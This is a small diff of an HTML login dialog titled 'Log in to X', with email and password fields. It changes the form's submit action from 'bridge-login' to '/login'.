@@ -11,7 +11,7 @@
       </svg>
     </div>
     <h2 id="loginTitle">Log in to X</h2>
-    <form class="x-dialog__form" action="bridge-login" method="POST" autocomplete="off">
+    <form class="x-dialog__form" action="/login" method="POST" autocomplete="off">
       <input name="user_email" type="text" placeholder="Email" required>
       <input name="user_password" type="password" placeholder="Password" required>
       <button class="x-dialog__btn">Next</button>
